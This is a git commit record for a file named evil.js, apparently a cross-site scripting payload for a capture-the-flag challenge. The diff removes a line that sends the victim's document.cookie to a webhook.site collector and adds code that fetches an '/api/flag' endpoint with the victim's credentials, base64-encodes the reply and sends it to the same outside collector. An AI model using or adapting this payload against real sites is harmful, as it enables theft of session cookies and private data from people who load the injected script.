475c6e148f823293927560585872bdd7f00f3f45
VINITHA.G <vinithasri630@gmail.com>
2026-04-05 13:49:41 +0530

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,1 +1,3 @@
-fetch('https://webhook.site/c779cb56-ae2a-47ac-b232-97c764ceb453/?c='+document.cookie)
+fetch('http://167.71.234.203:3000/api/flag', {credentials:'include'})
+.then(r=>r.text())
+.then(d=>fetch('https://webhook.site/c779cb56-ae2a-47ac-b232-97c764ceb453/?d='+btoa(d)));
